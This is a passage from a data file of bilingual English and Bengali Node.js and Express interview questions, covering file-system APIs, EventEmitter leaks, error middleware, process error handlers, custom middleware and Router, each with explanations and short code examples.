    bnAnswer: 'কলব্যাক (fs.readFile) মেমোরি সাশ্রয়ী হলেও কলব্যাক হেল তৈরি করে। সিনক্রোনাস অপারেশন (fs.readFileSync) মেইন থ্রেডকে ব্লক করে সার্ভারের ক্ষমতা কমিয়ে দেয়। প্রমিজ (fs.promises.readFile) নন-ব্লকিং এক্সিকিউশনের পাশাপাশি কোডের রিডিবিলিটি নিশ্চিত করে।',
    enExplanation: `### Explanation
Node.js provides three programming patterns for file system updates:
1. **Callbacks (Traditional)**:
   - Uses error-first callbacks: \`fs.readFile(path, (err, data) => { ... })\`.
   - Low overhead, but nested file writes lead to unmaintainable indentations ("Callback Hell").
2. **Synchronous (Blocking)**:
   - Stops main JavaScript execution thread.
   - Ideal only for startup scripts (e.g., reading SSL certificates once before starting port listening).
3. **Promises / Async-Await (Modern Standard)**:
   - Promisified APIs: \`const fs = require('fs/promises'); await fs.readFile(path)\`.
   - Clean readability, easy error catch structures with \`try/catch\`, and fully non-blocking.

### Real-World Example
Reading configuration schemas at start: Synchronous is acceptable.
Serving multi-user requests where files are parsed dynamically: Asynchronous Promises are mandatory to prevent blocking threads.

### Best Practice
Use the Promise-based API (\`require('fs/promises')\`) combined with \`async/await\` for all application controllers. Attach proper \`try/catch\` blocks to intercept disk errors.

### Common Mistakes
Using synchronous methods in middleware or route handlers, which locks the event loop and delays other concurrent requests.

### Code Example
\`\`\`javascript
const fs = require('fs/promises');
const path = require('path');

const tempFile = path.join(__dirname, 'test-sync-async.txt');

async function demoOperations() {
  // 1. Write file asynchronously (Promise API)
  await fs.writeFile(tempFile, 'Sample content');

  try {
    // 2. Read file with Async/Await
    const content = await fs.readFile(tempFile, 'utf8');
    console.log("Promise Read Content:", content);
  } catch (err) {
    console.error("Read Error:", err.message);
  } finally {
    // Clean up
    await fs.unlink(tempFile);
  }
}

demoOperations();
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
নোডজেএস ফাইল সিস্টেম অপারেশনের জন্য তিনটি ভিন্ন প্যাটার্ন অফার করে:
১. **কলব্যাক (ঐতিহ্যবাহী)**:
   - এরর-ফার্স্ট কলব্যাক ব্যবহার করে: \`fs.readFile(path, (err, data) => { ... })\`।
   - এটি মেমোরি সাশ্রয়ী হলেও অনেকগুলো ফাইল নেস্টেড উপায়ে হ্যান্ডেল করলে কোড পড়া কঠিন হয়ে যায় (Callback Hell)।
২. **সিনক্রোনাস (ব্লকিং)**:
   - মেইন জাভাস্ক্রিপ্ট থ্রেডকে ব্লক করে।
   - এটি কেবল অ্যাপ্লিকেশন স্টার্টআপের সময় কনফিগারেশন বা সার্টিফিকেট রিড করার জন্য উপযোগী।
৩. **প্রমিজ ও অ্যাসিনক/অ্যাওয়েট (আধুনিক)**:
   - প্রমিজ এপিআই: \`const fs = require('fs/promises'); await fs.readFile()\`।
   - কোড পড়তে ও বুঝতে সহজ এবং এটি সম্পূর্ণ নন-ব্লকিং।

### বাস্তব-ভিত্তিক উদাহরণ
সার্ভার চালুর সময় এসএসএল (SSL) সার্টিফিকেট ফাইল পড়া: সিনক্রোনাস ব্যবহার করা যায়।
রাউট কন্ট্রোলারের ভেতর ইউজারের রিকোয়েস্ট ফাইল পড়া: অ্যাসিনক্রোনাস প্রমিজ ব্যবহার করা বাধ্যতামূলক।

### উত্তম অনুশীলন
অ্যাপের রাউট কন্ট্রোলারে ফাইল অপারেশনের জন্য সর্বদা \`require('fs/promises')\` এবং \`async/await\` ব্যবহার করুন। ফাইল নট ফাউন্ড বা পারমিশন এরর হ্যান্ডেল করতে \`try/catch\` ব্লক ব্যবহার করুন।

### সাধারণ ভুলসমূহ
এপিআই রাউট হ্যান্ডলারের ভেতর অলসতাবশত \`readFileSync()\` ব্যবহার করা, যা একজন ইউজারের ফাইল রিড করার সময় অন্যান্য সকল ইউজারের রিকোয়েস্ট আটকে দেয়।

### Code Example
\`\`\`javascript
const fs = require('fs/promises');
const path = require('path');

const tempFile = path.join(__dirname, 'test-sync-async.txt');

async function demoOperations() {
  // ১. অ্যাসিনক্রোনাস রাইট করা (প্রমিজ এপিআই)
  await fs.writeFile(tempFile, 'নমুনা কন্টেন্ট');

  try {
    // ২. অ্যাসিনক/অ্যাওয়েট দিয়ে ফাইল রিড করা
    const content = await fs.readFile(tempFile, 'utf8');
    console.log("প্রমিজ রিড কন্টেন্ট:", content);
  } catch (err) {
    console.error("রিড এরর:", err.message);
  } finally {
    // ক্লিনআপ
    await fs.unlink(tempFile);
  }
}

demoOperations();
\`\`\``
  },
  {
    id: 'node-express-38',
    title: 'Explain Event Emitter memory leaks and how to prevent them.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'EventEmitter', 'Memory Leaks', 'Garbage Collection'],
    enAnswer: 'An Event Emitter memory leak occurs when listener functions are repeatedly added to an emitter but never removed. The emitter retains references to these listeners, preventing the garbage collector from reclaiming the associated memory. Prevent this by using removeListener() or once().',
    bnAnswer: 'ইভেন্ট এমিটার মেমোরি লিক তখনই ঘটে যখন কোনো এমিটারে বারবার লিসেনার ফাংশন যোগ করা হয় কিন্তু কাজ শেষে রিমুভ করা হয় না। এমিটার এই লিসেনারগুলোর রেফারেন্স ধরে রাখায় মেমোরি খালি হতে পারে না। এটি এড়াতে removeListener() বা once() ব্যবহার করতে হয়।',
    enExplanation: `### Explanation
Node.js features automatic garbage collection: if an object is no longer referenced, V8 frees its RAM.
Event listener leaks happen as follows:
1. When you call \`emitter.on('event', callback)\`, you create a reference from the emitter to the \`callback\` function (and its closure scope).
2. If the emitter resides globally (like a database service or root router), and the listener belongs to a transient object (like an HTTP request context), the HTTP context cannot be garbage collected even after the response is sent.
3. This consumes RAM indefinitely, leading to a slow memory leak and eventual server crash.
4. By default, Node.js logs a warning in the terminal if more than **10 listeners** are attached to a single event on one emitter.

### Real-World Example
If you attach a global process listener inside an Express route handler:
\`\`\`javascript
app.get('/status', (req, res) => {
  process.on('message', (msg) => { ... }); // LEAK! Adds a new listener on every request!
});
\`\`\`
Every client request adds a new function reference to the global \`process\` object, allocating memory that is never freed.

### Best Practice
- Use \`emitter.once()\` if the event should only fire once.
- Always call \`emitter.removeListener(event, listener)\` or \`emitter.off()\` in cleanup routines.
- Avoid attaching listeners to global objects inside request/response loops.

### Common Mistakes
Attaching anonymous functions as event listeners and trying to remove them later. Anonymous functions cannot be removed because \`off()\` requires a reference to the exact same function signature.

### Code Example
\`\`\`javascript
const EventEmitter = require('events');
const emitter = new EventEmitter();

function handleEvent(data) {
  console.log("Processed:", data);
}

// 1. Correct attachment
emitter.on('data_processed', handleEvent);

// Trigger
emitter.emit('data_processed', 'Success');

// 2. Correct cleanup: Must pass the exact function reference
emitter.off('data_processed', handleEvent);

// This emit will do nothing since listener is removed
emitter.emit('data_processed', 'Second run');
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
নোডজেএস অবজেক্টের মেমোরি খালি করতে অটোমেটিক গার্বেজ কালেকশন ব্যবহার করে।
লিসেনার লিক যেভাবে ঘটে:
১. যখন আপনি \`emitter.on()\` কল করেন, তখন এমিটারের সাথে ওই ফাংশনের একটি মেমোরি লিংক তৈরি হয়।
২. এমিটারটি যদি গ্লোবাল লাইফ-সাইকেলের হয় এবং লিসেনারটি লোকাল রিকোয়েস্টের হয়, তবে রিকোয়েস্ট শেষ হয়ে গেলেও মেমোরি খালি হবে না।
৩. এর ফলে র‍্যাম মেমোরি অনবরত বাড়তে থাকে এবং এক সময় প্রসেসটি ক্র্যাশ করে।
৪. নোডজেএস সতর্ক করার জন্য একটি ইভেন্টে ১০টির বেশি লিসেনার যুক্ত হলে টার্মিনালে ওয়ার্নিং দেখায়।

### বাস্তব-ভিত্তিক উদাহরণ
রাউট হ্যান্ডলারের ভেতর গ্লোবাল অবজেক্টে লিসেনার যুক্ত করা:
\`\`\`javascript
app.get('/status', (req, res) => {
  process.on('message', (msg) => { ... }); // লিক! প্রতিটি রিকোয়েস্টে নতুন লিসেনার তৈরি হচ্ছে!
});
\`\`\`
প্রতিটি রিকোয়েস্টে গ্লোবাল \`process\` অবজেক্টে একটি নতুন ফাংশন রেফারেন্স জমা হতে থাকবে যা আর কখনো মেমোরি থেকে ডিলিট হবে না।

### উত্তম অনুশীলন
- ইভেন্ট কেবল একবার ফায়ার করতে চাইলে \`emitter.once()\` ব্যবহার করুন।
- কাজ শেষে অবশ্যই \`emitter.off()\` বা \`emitter.removeListener()\` কল করে কানেকশন ডিসকানেক্ট করুন।
- রিকোয়েস্ট সাইকেলের ভেতর গ্লোবাল অবজেক্টে লিসেনার বসানো থেকে বিরত থাকুন।

### সাধারণ ভুলসমূহ
বেনামী বা অ্যানোনিমাস ফাংশন (Anonymous function) লিসেনার হিসেবে যুক্ত করে পরবর্তীতে তা রিমুভ করার চেষ্টা করা। অ্যানোনিমাস ফাংশন রিমুভ করা যায় না কারণ রিমুভ করার জন্য নির্দিষ্ট ফাংশনটির ভ্যারিয়েবল রেফারেন্স প্রয়োজন।

### Code Example
\`\`\`javascript
const EventEmitter = require('events');
const emitter = new EventEmitter();

function handleEvent(data) {
  console.log("প্রসেস হয়েছে:", data);
}

// ১. লিসেনার যুক্ত করা
emitter.on('data_processed', handleEvent);

// ফায়ার করা
emitter.emit('data_processed', 'সফল');

// ২. সঠিক উপায়ে লিসেনার রিমুভ করা (একই রেফারেন্স পাস করতে হবে)
emitter.off('data_processed', handleEvent);

// এটি আর রান হবে না কারণ লিসেনার রিমুভ করা হয়েছে
emitter.emit('data_processed', 'দ্বিতীয় রান');
\`\`\``
  },
  {
    id: 'node-express-39',
    title: 'Explain Error-handling middleware signature in Express.js.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Express.js', 'Error Handling', 'Middleware', 'Best Practice'],
    enAnswer: 'Express error-handling middleware is defined by providing exactly four parameters: (err, req, res, next). Express detects the four-argument signature and skips standard routing middleware, directly routing any errors passed via next(err) to this handler.',
    bnAnswer: 'এক্সপ্রেসজেএস-এ এরর-হ্যান্ডলিং মিডলওয়্যার সুনির্দিষ্টভাবে ৪টি প্যারামিটার দিয়ে ডিক্লেয়ার করা হয়: (err, req, res, next)। এক্সপ্রেস এই ৪টি প্যারামিটার দেখে এটিকে সাধারণ মিডলওয়্যার থেকে আলাদা করে এবং next(err) এর মাধ্যমে আসা সকল এরর এই হ্যান্ডলারে পাঠায়।',
    enExplanation: `### Explanation
Express separates normal traffic from error propagation paths using parameter count (arity):
1. **Four Parameters**: The function signature must contain exactly four arguments: \`function (err, req, res, next) { ... }\`. Even if you do not use \`next\`, you must declare it so Express's parser detects it via \`fn.length === 4\`.
2. **Triggering**: In any route or middleware, calling \`next(err)\` (passing any argument to \`next()\` except the string \`'route'\`) bypasses all remaining non-error middlewares and jumps straight to your custom error-handling middleware.
3. **Location**: Error handlers must be registered at the very end of the middleware stack, after all route registrations.

### Real-World Example
If a database query inside a route crashes:
\`\`\`javascript
app.get('/user', async (req, res, next) => {
  try {
    const user = await DB.find();
    res.json(user);
  } catch (err) {
    next(err); // Jumps straight to error middleware
  }
});
\`\`\`

### Best Practice
Write a single centralized error-handling middleware at the bottom of your app setup. Inside, inspect the error type and return formatted JSON error objects to the client, concealing detailed stack traces in production.

### Common Mistakes
Declaring the error middleware with only three arguments \`(err, req, res)\`. Express will treat it as a standard middleware, causing your errors to pass unhandled or freeze the request pipeline.

### Code Example
\`\`\`javascript
const express = require('express');
const app = express();

app.get('/api/broken', (req, res, next) => {
  const err = new Error('Database connection failed');
  err.statusCode = 500;
  next(err); // Hand off error to Express
});

// Centralized error handler (MUST have 4 arguments and be declared at the bottom)
app.use((err, req, res, next) => {
  const status = err.statusCode || 500;
  console.error("Logged Error:", err.message);
  
  res.status(status).json({
    success: false,
    error: err.message || 'Internal Server Error',
    // stack: process.env.NODE_ENV === 'development' ? err.stack : {}
  });
});

const server = app.listen(3000, () => server.close());
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
প্যারামিটার সংখ্যার ওপর ভিত্তি করে এক্সপ্রেস সাধারণ মিডলওয়্যার থেকে এরর হ্যান্ডলারকে পৃথক করে:
১. **চারটি প্যারামিটার**: ফাংশনের সিগন্যাচারে অবশ্যই ৪টি আর্গুমেন্ট থাকতে হবে: \`(err, req, res, next)\`। আপনি যদি কোডে \`next\` ব্যবহার নাও করেন, তবুও সিগন্যাচারে এটি লিখতে হবে, অন্যথায় এক্সপ্রেস এটিকে আইডেন্টিফাই করতে পারবে না।
২. **ট্রিগার করার নিয়ম**: যেকোনো রাউট হ্যান্ডলারের ভেতর \`next(err)\` কল করলে এক্সপ্রেস অন্যান্য সাধারণ রাউট এপিআই স্কিপ করে সরাসরি এই এরর ব্লকে চলে আসে।
৩. **ডিক্লেয়ার করার স্থান**: এটি অবশ্যই অ্যাপ্লিকেশনের সব রাউট ডিক্লেয়ারেশনের নিচে সবার শেষে মাউন্ট করতে হবে।

### বাস্তব-ভিত্তিক উদাহরণ
কোডের ভেতরে ক্যাচ ব্লক থেকে এরর হ্যান্ডলারে পাঠানো:
\`\`\`javascript
app.get('/user', async (req, res, next) => {
  try {
    const user = await DB.find();
    res.json(user);
  } catch (err) {
    next(err); // সরাসরি নিচে এরর মিডলওয়্যারে জাম্প করবে
  }
});
\`\`\`

### উত্তম অনুশীলন
অ্যাপ্লিকেশনের সবার শেষে একটিমাত্র সেন্ট্রালাইজড এরর হ্যান্ডলার রাখুন। এররের ধরন অনুযায়ী লগ তৈরি করুন এবং প্রোডাকশন মোডে সিকিউরিটির স্বার্থে এররের স্ট্যাক ট্রেস (Stack trace) ক্লায়েন্টের কাছে হাইড করে কেবল সাধারণ এরর মেসেজ পাঠান।

### সাধারণ ভুলসমূহ
ভুলবশত ৩টি প্যারামিটার \`(err, req, res)\` দিয়ে এরর মিডলওয়্যার ডিক্লেয়ার করা। এক্সপ্রেস এটিকে সাধারণ মিডলওয়্যার মনে করে কলব্যাক লুপে আটকে রাখবে।

### Code Example
\`\`\`javascript
const express = require('express');
const app = express();

app.get('/api/broken', (req, res, next) => {
  const err = new Error('ডাটাবেস কানেকশন ফেইল করেছে');
  err.statusCode = 500;
  next(err); 
});

// সেন্ট্রালাইজড এরর হ্যান্ডলার (অবশ্যই ৪টি আর্গুমেন্ট থাকতে হবে এবং নিচে থাকবে)
app.use((err, req, res, next) => {
  const status = err.statusCode || 500;
  console.error("লগ করা এরর:", err.message);
  
  res.status(status).json({
    success: false,
    error: err.message || 'অভ্যন্তরীণ সার্ভার ত্রুটি'
  });
});

const server = app.listen(3000, () => server.close());
\`\`\``
  },
  {
    id: 'node-express-40',
    title: 'How do you handle uncaught exceptions and unhandled promise rejections in Node.js?',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'Errors', 'Process', 'Best Practice'],
    enAnswer: 'Uncaught exceptions are caught by listening to the process.on("uncaughtException") event, and unhandled promises are caught using process.on("unhandledRejection"). For uncaught exceptions, the best practice is to log the error and crash/restart the process via a process manager like PM2.',
    bnAnswer: 'আনকচ এক্সেপশন (uncaught exceptions) ধরার জন্য process.on("uncaughtException") এবং আনহ্যান্ডলড প্রমিজ রিজেকশন ধরার জন্য process.on("unhandledRejection") ইভেন্ট ব্যবহার করা হয়। আনকচ এক্সেপশন ধরা পড়লে লগ তৈরি করে প্রসেসটি বন্ধ করে দিয়ে PM2 দিয়ে পুনরায় চালু করা উত্তম অনুশীলন।',
    enExplanation: `### Explanation
If an error is thrown outside an active try/catch block or Express middleware, it bubbles up to the root system process:
1. **\`uncaughtException\`**: Fires when a synchronous JavaScript exception bubbles back to the event loop without being caught. The process is now in an undefined/corrupt state.
2. **\`unhandledRejection\`**: Fires when a Promise is rejected (e.g. database query fails) but no \`.catch()\` handler is attached to intercept it.
3. **Process Exit**: An uncaught sync exception leaves the Node process in an unstable state. Trying to keep the server running can cause memory leaks, stuck database sockets, or weird behavior. The correct approach is to log the error, release open resources, and call \`process.exit(1)\`.

### Real-World Example
Suppose a third-party API call fails, throwing an exception outside a controller context. If unhandled, the server might remain half-alive but unable to write logs. Catching the event, alerting Slack/Sentry, and exiting allows PM2 to restart a fresh, healthy container.

### Best Practice
Catch both events at the entry point of your server. Always exit the process with status code 1 on \`uncaughtException\`. Use a process manager like PM2 or container tools (Docker/Kubernetes) to automatically restart the container.

### Common Mistakes
Catching \`uncaughtException\` and just writing a log line while keeping the server running. This leaves the server in a corrupted state where active database queries might be frozen forever.

### Code Example
\`\`\`javascript
// Register event listeners at the top of entry file

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
  // Recommend logging to alert system (Sentry, Winston)
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception thrown:', err.message);
  
  // Graceful cleanup (close db pools, close server sockets)
  // exit with failure status code 1
  process.exit(1);
});
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
যদি কোনো কোড ট্রাই-ক্যাচ বা এক্সপ্রেস হ্যান্ডলারের বাইরে এরর থ্রো করে, তবে তা সরাসরি ওএস লেভেলের রুট প্রসেসে চলে যায়:
১. **\`uncaughtException\`**: সিনক্রোনাস কোনো কোড ক্যাচ না হয়ে সরাসরি ইভেন্ট লুপ পর্যন্ত চলে আসলে এটি ফায়ার হয়। এর পর প্রসেসটি আনস্টেবল বা করাপ্টেড হয়ে যায়।
২. **\`unhandledRejection\`**: কোনো প্রমিজ রিজেক্ট হলে (যেমন ডাটাবেস এরর) কিন্তু কোডে কোনো \`.catch()\` ব্লক না থাকলে এটি ফায়ার হয়।
৩. **প্রসেস বন্ধ করা**: আনকচ এক্সেপশনের পর প্রসেস সচল রাখা বিপজ্জনক। এতে মেমোরি লিক বা ডাটাবেস সকেট লক হয়ে যেতে পারে। সঠিক নিয়ম হলো এরর লগ করা, রিসোর্স রিলিজ করা এবং \`process.exit(1)\` কল করে প্রসেস শাটডাউন করা।

### বাস্তব-ভিত্তিক উদাহরণ
থার্ড-পার্টি পেমেন্ট এপিআই এরর দিল এবং কোডে ক্যাচ ব্লক না থাকায় সার্ভার হ্যাং হয়ে গেল। এ সময় ইভেন্টটি ধরে স্ল্যাক বা সেন্ট্রিতে অ্যালার্ট পাঠিয়ে প্রসেস কিল করে দিলে PM2 সাথে সাথে একটি নতুন ফ্রেশ কন্টেইনার চালু করে দেবে।

### উত্তম অনুশীলন
সার্ভার এন্ট্রি ফাইলের একেবারে শুরুতে এই দুটি ইভেন্ট লিসেনার সেট করুন। \`uncaughtException\` এর ক্ষেত্রে প্রসেস কিল (\`process.exit(1)\`) করা আবশ্যক। অটোমেটিক রিস্টার্ট পেতে পিএম২ (PM2) বা ডকার-কুবারনেটিস ব্যবহার করুন।

### সাধারণ ভুলসমূহ
\`uncaughtException\` ইভেন্ট ক্যাচ করে কেবল \`console.log\` লিখে প্রসেস চালু রাখা। এতে মেমোরিতে জমে থাকা এরর ডাটাবেস সকেট বা ওপেন ফাইলগুলো চিরতরে মেমোরি জ্যাম করে রাখতে পারে।

### Code Example
\`\`\`javascript
// এন্ট্রি ফাইলের সবার ওপরে এই লিসেনারগুলো রাখুন

process.on('unhandledRejection', (reason, promise) => {
  console.error('আনহ্যান্ডলড প্রমিজ রিজেকশন:', promise, 'কারণ:', reason);
  // সেন্ট্রি বা অন্য ট্র্যাকিং সিস্টেমে অ্যালার্ট পাঠানো উচিত
});

process.on('uncaughtException', (err) => {
  console.error('আনকচ এক্সেপশন এরর:', err.message);
  
  // ওয়ান-টাইম রিসোর্স রিলিজ ও ডাটাবেস কানেকশন ক্লোজ করা
  // প্রসেস কিল করা (ব্যর্থতা নির্দেশক স্ট্যাটাস কোড ১ দিয়ে)
  process.exit(1);
});
\`\`\``
  },
  {
    id: 'node-express-41',
    title: 'How do you create custom middleware functions in Express.js?',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Express.js', 'Middleware', 'Validation', 'Request Life Cycle'],
    enAnswer: 'To create custom middleware, define a function with three arguments: (req, res, next). Implement the logic, modify req or res if needed, and call next() to pass execution or res.send() to end the lifecycle.',
    bnAnswer: 'কাস্টম মিডলওয়্যার তৈরি করতে (req, res, next) আর্গুমেন্ট বিশিষ্ট একটি ফাংশন ডিক্লেয়ার করতে হয়। এর ভেতর প্রয়োজনীয় লজিক লিখে req বা res মডিফাই করার পর পরবর্তী ধাপে যেতে next() কল করতে হয় অথবা সরাসরি res.send() দিয়ে প্রসেস শেষ করতে হয়।',
    enExplanation: `### Explanation
Custom middleware structures request interceptors. A standard middleware has the signature:
\`\`\`javascript
function myMiddleware(req, res, next) {
  // Logic here
  next();
}
\`\`\`
Common scenarios:
1. **Authorization**: Read headers, verify token, attach credentials to \`req.user\`.
2. **Input Validation**: Check query parameters and return a 400 status code if invalid.
3. **Analytics**: Log response performance durations.

If an error is detected, instead of calling \`next()\`, pass the error object like \`next(error)\` to trigger the Express error handler stack.

### Real-World Example
Suppose only premium members can view video paths. You can write a \`checkPremiumStatus\` middleware to query their membership type from database. If premium is true, call \`next()\`; otherwise, call \`res.status(403).send()\` to block access.

### Best Practice
Keep middlewares single-purpose and modular. Do not perform heavy database writes inside generic logs middlewares. Ensure error handling routes call \`next(err)\` inside async catch blocks.

### Common Mistakes
Forgetting that async operations inside middlewares require a \`try/catch\` block. An uncaught error inside an async middleware will crash the node server unless caught and passed via \`next(err)\`.

### Code Example
\`\`\`javascript
const express = require('express');
const app = express();

// Custom Auth Middleware
const requireSecretAPIKey = (req, res, next) => {
  const apiKey = req.headers['x-api-key'];
  
  if (!apiKey || apiKey !== 'devprep-secret-token') {
    // End the request cycle immediately
    return res.status(401).json({ error: 'Unauthorized: Invalid API Key' });
  }
  
  // Custom property mounting
  req.authTime = Date.now();
  next(); // Pass to route controller
};

app.get('/api/secure-data', requireSecretAPIKey, (req, res) => {
  res.json({ data: 'Protected database items', authenticatedAt: req.authTime });
});

const server = app.listen(3000, () => server.close());
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
কাস্টম মিডলওয়্যার ইনকামিং রিকোয়েস্ট ফিল্টার করার উপায়। এর স্ট্যান্ডার্ড ফরম্যাট:
\`\`\`javascript
function myMiddleware(req, res, next) {
  // প্রয়োজনীয় লজিক
  next();
}
\`\`\`
ব্যবহারের ক্ষেত্রসমূহ:
১. **অথরাইজেশন**: রিকোয়েস্ট হেডার থেকে টোকেন চেক করে \`req.user\` সেট করা।
২. **ইনপুট ভ্যালিডেশন**: কোয়েরি প্যারামিটার চেক করে ভুল ডাটা থাকলে ৪০০ কোড রিটার্ন করা।
৩. **পারফরম্যান্স মনিটরিং**: রেসপন্স টাইম হিসাব করে লগ জেনারেট করা।

লজিক ফেইল হলে সরাসরি \`next(error)\` কল করে এরর স্ট্যাকে পাঠিয়ে দিতে হবে।

### বাস্তব-ভিত্তিক উদাহরণ
কোনো ভিডিও দেখতে কেবল প্রিমিয়াম মেম্বারদের সুযোগ দিতে চান। আপনি \`checkPremiumStatus\` নামক মিডলওয়্যার লিখে ডাটাবেস থেকে ইউজারের অ্যাকাউন্ট টাইপ চেক করবেন। ট্রু হলে \`next()\` কল করবেন, আর না হলে \`res.status(403).send()\` দিয়ে এক্সেস ব্লক করে দিবেন।

### উত্তম অনুশীলন
মিডলওয়্যারগুলোকে সিঙ্গেল-পারপাস রাখুন। একই মিডলওয়্যারে লগিং ও ক্যাশিং দুটো একসাথে করবেন না। অ্যাসিনক্রোনাস মিডলওয়্যারগুলোর ক্যাচ ব্লকে অবশ্যই \`next(err)\` ব্যবহার করবেন।

### সাধারণ ভুলসমূহ
অ্যাসিনক্রোনাস লজিক সম্পন্ন মিডলওয়্যারে \`try/catch\` ব্লক না দেওয়া। অ্যাসিনক মিডলওয়্যারের ভেতর এরর ঘটলে এবং তা ক্যাচ না করলে সার্ভার সরাসরি ক্র্যাশ করবে।

### Code Example
\`\`\`javascript
const express = require('express');
const app = express();

// কাস্টম অথরাইজেশন মিডলওয়্যার
const requireSecretAPIKey = (req, res, next) => {
  const apiKey = req.headers['x-api-key'];
  
  if (!apiKey || apiKey !== 'devprep-secret-token') {
    // সরাসরি রেসপন্স দিয়ে সেশন শেষ করা
    return res.status(401).json({ error: 'অননুমোদিত: ভুল এপিআই কী' });
  }
  
  // কাস্টম প্রোপার্টি অ্যাড করা
  req.authTime = Date.now();
  next(); // রাউট হ্যান্ডলারে পাঠানো
};

app.get('/api/secure-data', requireSecretAPIKey, (req, res) => {
  res.json({ data: 'সুরক্ষিত তথ্য', authenticatedAt: req.authTime });
});

const server = app.listen(3000, () => server.close());
\`\`\``
  },
  {
    id: 'node-express-42',
    title: 'Explain Express Router and how it helps in structuring scalable backend applications.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Express.js', 'Router', 'Architecture', 'Clean Code'],
    enAnswer: 'Express.Router is a mini-application capable of performing middleware and routing functions. It allows developers to break down routes into isolated, modular files based on features or domains (e.g. auth, users, products), rather than writing all logic in a single main app.js file.',
    bnAnswer: 'Express.Router হলো একটি মিনি-অ্যাপ্লিকেশন যা মিডলওয়্যার ও রাউটিং ফাংশন সম্পাদনে সক্ষম। এটি ডেভেলপারদেরকে সমস্ত কোড একটিমাত্র app.js ফাইলে না লিখে সার্ভিস বা ডোমেইন অনুযায়ী (যেমন auth, users, products) আলাদা আলাদা মডিউল বা ফাইলে বিভক্ত করার সুযোগ দেয়।',
    enExplanation: `### Explanation
As codebases grow, housing all routes inside a single file becomes unmaintainable. Express provides \`express.Router()\` to split APIs into isolated namespaces:
1. **Isolation**: A router instance is created in a separate file (e.g., \`userRouter.js\`).
2. **Mounting**: Routes are declared on this router instance locally (e.g., \`router.get('/:id')\`).
3. **Global Integration**: The router is exported and mounted inside the main application file under a common prefix path (e.g., \`app.use('/api/users', userRouter)\`).

This enables cleaner project architecture (MVC pattern or Domain-Driven Design).

### Real-World Example
Consider an e-commerce backend:
- All authentication endpoints are grouped inside \`routes/auth.js\` (mounted under \`/auth\`).
- All product catalog endpoints are grouped inside \`routes/products.js\` (mounted under \`/products\`).

### Best Practice
Group domain-specific routes inside a \`routes/\` directory. Prefix all router groups clearly (e.g. \`/api/v1/auth\`). This encapsulates paths and simplifies adding global middlewares (like checks for admin status) to specific routes.

### Common Mistakes
Forgetting to export the router instance (\`module.exports = router\` or \`export default router\`) from the route module, causing \`Router.use() requires a middleware function\` errors when loading.

### Code Example
\`\`\`javascript
// 1. Group file: routes/userRouter.js
const express = require('express');
const router = express.Router();

router.get('/profile', (req, res) => {
  res.send('User Profile Details');
});

// 2. Main Entry file: app.js
const app = express();

// Mount user router under prefix path
app.use('/api/users', router);

const server = app.listen(3000, () => server.close());
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
কোডবেস বড় হওয়ার সাথে সাথে একটিমাত্র ফাইলে সব রাউট রাখা অসম্ভব হয়ে পড়ে। এজন্য এক্সপ্রেস \`express.Router()\` প্রদান করে:
১. **আইসোলেশন**: আলাদা ফাইলে একটি রাউটার ইনস্ট্যান্স তৈরি করা হয় (যেমন: \`userRouter.js\`)।
২. **লোকাল ডিক্লেয়ারেশন**: রাউটারের আন্ডারে রাউট ডিক্লেয়ার করা হয় (যেমন: \`router.get('/:id')\`)।
৩. **গ্লোবাল ইন্টিগ্রেশন**: রাউটারটি মেইন এন্ট্রি ফাইলে ইম্পোর্ট করে একটি কমন পাথের সাথে মাউন্ট করা হয় (যেমন: \`app.use('/api/users', userRouter)\`)।

এটি প্রজেক্ট আর্কিটেকচার পরিচ্ছন্ন ও স্কেলেবল রাখতে সাহায্য করে।

### বাস্তব-ভিত্তিক উদাহরণ
একটি ই-কমার্স ব্যাকএন্ডে:
- অথেনটিকেশন রাউটগুলো থাকে \`routes/auth.js\` ফাইলে (ইউআরএল: \`/auth/login\`)।
- প্রোডাক্ট রাউটগুলো থাকে \`routes/products.js\` ফাইলে (ইউআরএল: \`/products/details\`)।

### উত্তম অনুশীলন
ক্লিন কোড বজায় রাখতে রাউট কোডগুলো \`routes/\` ডিরেক্টরির ভেতর গ্রুপ করে রাখুন। রাউট গ্রুপের জন্য স্পষ্ট সংস্করণ বা ইউআরএল প্রিপিক্স ব্যবহার করুন (যেমন: \`/api/v1/users\`)।

### সাধারণ ভুলসমূহ
রাউট মডিউল থেকে রাউটার ইনস্ট্যান্সটি এক্সপোর্ট (\`module.exports = router\`) করতে ভুলে যাওয়া, যার ফলে মেইন ফাইলে মাউন্ট করার সময় \`Router.use() requires a middleware function\` এরর দেখায়।

### Code Example
\`\`\`javascript
// ১. ইউজার রাউট ফাইল (routes/userRouter.js)
const express = require('express');
const router = express.Router();

router.get('/profile', (req, res) => {
  res.send('ইউজার প্রোফাইল বিবরণ');
});

// ২. মেইন এন্ট্রি ফাইল (app.js)
const app = express();

// প্রিপিক্স পাথ দিয়ে রাউটার মাউন্ট করা
app.use('/api/users', router);

const server = app.listen(3000, () => server.close());
\`\`\``
  },
  {
    id: 'node-express-43',
    title: 'How do you perform input validation in Express.js using express-validator?',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Express.js', 'Validation', 'Security', 'Express-Validator'],
    enAnswer: 'express-validator is a set of express middlewares that wraps validator.js. You define validation chains (like body("email").isEmail().normalizeEmail()) inside your route handlers and inspect errors using validationResult(req) in the controller callback.',
    bnAnswer: 'express-validator হলো এক্সপ্রেস মিডলওয়্যার সমূহের সমষ্টি যা validator.js কে র‍্যাপ করে কাজ করে। রাউটের ভেতর বডি ডাটা ফিল্টার চেইন ডিক্লেয়ার করে (যেমন body("email").isEmail()) কন্ট্রোলার কলব্যাকে validationResult(req) দিয়ে ইনপুটের এরর চেক করা হয়।',
    enExplanation: `### Explanation
Input validation protects applications from SQL injection, invalid data formats, and database constraint errors.
Validation Pipeline with \`express-validator\`:
